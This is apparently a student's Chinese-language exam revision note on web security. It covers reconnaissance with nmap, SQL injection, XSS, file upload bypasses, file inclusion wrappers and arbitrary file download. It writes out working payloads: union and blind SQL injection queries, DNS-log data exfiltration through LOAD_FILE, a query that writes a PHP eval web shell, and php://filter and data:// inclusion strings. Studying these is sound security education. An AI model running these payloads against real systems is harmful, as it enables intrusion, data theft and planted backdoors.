# web考试复习

## Web应用服务器处理HTTP报文的过程

静态网页：

![image-20220314152240104](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314152240.png[docusaurus](https://github.com/0xxtoby/docusaurus))

动态网页：

![image-20220314152409310](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314152409.png)

## URL格式：

![image-20220314152913660](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314152913.png)

URL编码：

```
•%3d  =
•%23  #
•%25  %
•%26  &
•%2f  /
•%20  空格
•%0a  新行
•%00  空字节
```

## HTTP报文：

HTTP请求报文由请求行、请求头部、空行和请求数据4个部分组成，请求行由请求方法、URL和HTTP协议版本3个字段组成。

HTTP响应报文由状态行、消息报头、空行、响应正文4个部分组成，请求行由HTTP协议版本、状态码和状态描述3个字段组成。

## session和cookie的区别和关系

Cookie是通过客户端记录信息确定用户的身份，cookie的数据保存在客户端；Session是通过服务端记录信息确定用户身份，session保存在服务端。

Session保存在服务器会更加安全，cookie信息可以被他人盗取、篡改，不太安全。

Cookie由服务端生成，服务端将数据通过http响应存储在浏览器上；session与浏览器无关，session以cookie为基础，将数据存在在服务端，将表示这份数据的session ID以cookie的形式存在客户端。

Session是一个“泛”的概念，可以算是Cookie的拓展，“绕过”Cookie的一些限制，跨域请求问题

## 数据库分类

![image-20220314153733056](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314153733.png)

## 信息收集

dns搜索子域名：subdomain,onforall

证书信息收集：crt.sh

企业信息收集：whois、站长之家、天眼查

目录敏感信息：dirsearch,御剑

端口检测：nmap、fscan

```
常用参数：
-sP: Ping扫描,效率高,返回信息少. 例: nmap -sP 192.168.1.110 
-P0(Pn): 无Ping扫描,可以躲避防火墙防护,可以在目标主机禁止ping的情况下使用
-sS: TCP SYN 扫描,速度快, 1秒1000次左右. 较为隐蔽.
-sT: TCP连接扫描
-sV: 版本探测 ,通过相应的端口探测对应的服务,根据服务的指纹识别出相应的版本.
-T: 时序选项, -TO-T5. 用于IDS逃逸,0=>非常慢,1=>缓慢的,2=>文雅的,3=>普通的,4=>快速的,5=>急速的
-iL: 扫描一个列表文件 例 nmap -iL list.txt
-sU: UDP扫描,扫描非常慢,容易被忽视
-A :全面扫描. 综合扫描. 是一种完整扫描目标信息的扫描方式.  
-p : 指定扫描端口
```

web指纹：潮汐指纹、wappalyzer插件、cms识别、云悉指纹、御剑

旁站查询：nmap、hunter

搜索引擎：fofa、hunter

## 越权

关键：未对权限进行校验 

利用：对id进行遍历等

## SQL注入

本质：插入了sql代码 

类型：union select 联合查询、报错注入、 bool盲注、时间盲注 

利用：oob数据外带、 写入文件getshell

#### **探测：**

1、判断数据库类型：报错、端口信息

2、寻找注入点：GET、POST、Cookie

*确认注入点的核心思想就是判断插入的数据是否被当做SQL语句执行

3、区分数据类型：数字型、字符型、搜索型

4、终止：在注入SQL代码后，将原有的查询代码全部注释掉（#、--+）

#### SQL注入类型

1、堆叠查询：是指可以在单次数据库连接中，执行多个查询序列。简单的来说就是执行多条语句。

2、union联合查询：

![image-20220314160224692](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314160224.png)

**MySQL类型的sql注入联合查询注入查出school数据库中student表中username和age字段数据的流程是什么(提供详细的查询语句)？** 

```
-1’ union select 1,2,3--+      //查看回显
-1’ union select 1,2,database()--+   //获取数据库名为school
-1’ union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="school"--+       //获取school数据库下的数据表
-1’ union select 1,2, group_concat(column_name) from information_schema.columns where table_name="student"--+       //获取student数据表中的字段值
-1’ union select 1,2, concat_ws(char(32,58,32),username,password) from student--+  //查询student数据表中username和password的值
```

3、报错注入：利用页面返回的MySQL报错信息，将想得到的数据通过报错信息带出。

Updatexml、extractvalue、rand()等

```
select 1 and updatexml(1,concat(0x7e,(select user()),0x7e),1);
select 1 and extractvalue(1,concat(0x7e,(select user()),0x7e));
```

4、盲注：当不能直接通过显示数据来获得数据库数据时，需要使用其他方式判断或者尝试，这个过程就是盲注。

基于布尔盲注(根据页面返回内容判断)

----------left函数：left(a,b)从a的左侧截取a的前b位正确返回1，错误返回0。

```
 select 1 and left(database(),1)='s';
```

----------substr函数：select database() substr(1,1),substr(a,b,c)从b截取a的c位长度

```
select substr((select username from users limit 0,1),1,1);
```

----------ascii: ascii('s')获取s的ascii值

```
select ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))<68; 
```

基于时间盲注(根据页面响应时间判断)

```
select if((ascii(substr((select username from users limit 0,1),1,1))=68),sleep(5),2);
```

**简述sql注入中联合查询和盲注有什么区别、盲注分为哪几种类型?**

联合查询是由两个或两个以上的select语句组成，查询结果通过页面回显出来；盲注是当页面无法回显数据库数据时，通过盲注根据页面是否能正常返回页面或者页面的响应时间来判断。

盲注分为布尔盲注和时间盲注：

布尔盲注通过页面返回的内容来判断，当select语句查询为真时，页面内容正常，当select语句查询为假时，页面中有些信息不会显示出来。函数主要有left函数、substr函数、ascii函数。

时间盲注主要通过页面响应的时间来判断，当select语句查询为真时，页面会根据select语句等待几秒后才出现页面内容。主要的函数有sleep函数。

#### SQL注入利用

数据外带：（dnslog）

```
select CONCAT("\\\\",version(),"2.ccz549.dnslog.cn\\a.txt");
select LOAD_FILE(CONCAT("\\\\",version(),"2.ccz549.dnslog.cn\\a.txt"));
```

写shell：

```
 select "<?php eval($_POST['x'];?>" into outfile "D:/phpstudy/WWW/sqli/Less-1/shell.php";
```

## XSS跨站脚本攻击

本质：插入了 javascript代码 

分类：反射型、 存储型、dom型 

利用：弹窗、打 cookie、钓鱼、

#### **寻找xss漏洞**

寻找WEB应用上的输入与输出口。例如网站输入框、URL参数等等。

在可控参数中提交<script>alert(/xss/)</script>等攻击字符串，观察输出点是否对这些攻击字符串进行转义、过滤、消毒等处理。

如果原样输出，那么必然存在XSS漏洞。

#### **阐述xss有几种类型，各有什么区别?**

XSS有反射型XSS、存储型XSS和DOM型XSS三种类型。

反射型XSS在有文本框的情况下就可能出现，反射型XSS不经过数据库，通过网页直接解析java script代码。因为没有存储，所以只能解析一次。

存储型XSSPayload是有经过存储的，当一个页面存在存储型XSS的时候，XSS注入成功后，那么每次访问该页面都将触发XSS，如留言板

反射型或存储型是服务端将提交的内容反馈到了html源码内，导致触发xss。也就是说返回到html源码中可以看到触发xss的代码。

DOM型XSS主要通过java script操作document，实现dom树的重构，主要是通过查看网页的代码，用户可以在文本框或者url写入java script代码修改网页的dom，造成客户端payload在浏览器中执行，也只能执行一次，不存在存储功能。DOM型XSS只与客户端上的js交互，也就是说提交的恶意代码，被放到了js中执行，然后显示出来

#### **危害**：

•Cookie盗取

•钓鱼（伪造登录框，页面）

•获取IP段

•站点重定向

•获取客户端页面信息，例如邮件内容窃取

•XSS蠕虫

## 文件上传漏洞

本质：插入了可执行脚本 文件(asp、jsp、php) 

分类：js绕过、MIME绕 过、黑名单绕过、双写绕过、图片马等等 

利用：burpsuite抓包改包、找路径

#### **绕过方式：**

1、客户端JavaScript验证

2、服务端MIME类型验证（content-type）

3、服务端文件扩展名验证

​                      黑名单（大小写、php|php2|php3|php4|php5解析、%00会截断文件名，只保存%00之前的内容、）

​                      白名单

4、服务器文件内容验证（.htaccess的配置有效，写入SetHandler application/x-httpd-php ）

5、操作系统特性（空格、.）

6、服务器解析漏洞：指利用中间件(Apache、nginx、iis等)

apache解析文件规则是从右到左

 iis解析：

​              目录解析：目录名为.asp、.asa、.cer，则目录下的所有文件都会被作为ASP解析。

​              文件解析：文件名中分号后不被解析，例如.asp;、.asa;、.cer;。

​             文件类型解析：.asa，.cer，.cdx都会被作为asp文件执行。 

nginx：当用户配置不当，会导致任意文件被当作php去解析

​              （利用过程：1.上传一个`shell.jpg `文件，注意最后为空格

​                                     2.访问`url/shell.jpg[0x20][0x00].php`）

7、文件头(文件幻数)

## 文件包含

本质：包含了可执行代码(asp、jsp、php) 

分类：本地文件包含、远程文件包含 

利用：包含远程或者本地php文件，伪协议

#### 函数：

include与require基本是相同的，除了错误处理方面:

•include()，只生成警告（E_WARNING），并且脚本会继续

•require()，会生成致命错误（E_COMPILE_ERROR）并停止脚本

•include_once()与require()_once()，如果文件已包含，则不会包含，其他特性如上

#### 伪协议：

**php://input**：可以获取POST的数据流。当它与包含函数结合时，php://input流会被当作php文件执行。从而导致任意代码执行。

**php://filter**：可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。

```
?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
```

**zip://**：可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行

```
zip://[压缩包绝对路径]#[压缩包内文件]
```

**phar://**：中相对路径和绝对路径都可以使用

**data://**：类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致 任意代码执行

```
data://[<MIME-type>][;charset=][;base64],<data>
?filename=data://,<?php phpinfo();
?filename=data://text/plain,<?php phpinfo();
?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
?filename=data:text/plain,<?php phpinfo();
?filename=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
```

#### 绕过方式：

前缀绕过：使用../../来返回上一目录，被成为目录遍历(Path Traversal)

后缀绕过：

![image-20220314185037172](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314185042.png)

![image-20220314185057380](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314185057.png)

#### 防御：

•allow_url_include和allow_url_fopen最小权限化

•设置open_basedir（open_basedir 将php所能打开的文件限制在指定的目录树中）

•白名单限制包含文件，或者严格过滤./\

####  **文件上传和文件包含应该如何联动？**

在文件上传漏洞时，我们可以上传图片马或者php代码，然后查看文件上传的路径。在本地文件包含时，可以直接在filename后面写入我们上传的文件的路径，访问url就可以读取到这个文件。

我们也可以上传图片马之后，复制打开图片马的url，然后在远程文件包含的filename后面写上图片马的url，也可以完成文件包含漏洞。

#### **文件包含中两种类型的区别是什么？**

文件包含主要有本地文件包含和远程文件包含两种。

本地文件包含是直接在网页url中的filename后面写入目标主机内的文件去读取；是获取目标主机本地的文件。

远程文件包含是通过php伪协议通过在网页url中的filename后写入php伪协议和文件路径去读取文件内容，可以读取到攻击者主机上的文件内容，也可以读取url的内容。

## 任意文件下载

本质：插入了恶 意的文件路径 

利用：利用 payload下载任 意文件

实现过程：根据参数filename的值，获得该文件在网站上的绝对路径，读取文件内容，发送给客户端进行下载。

利用：

•获得站点源码(黑盒->白盒)

•获得站点与中间件配置文件。

•获得应用与系统配置文件(ssh、mysql)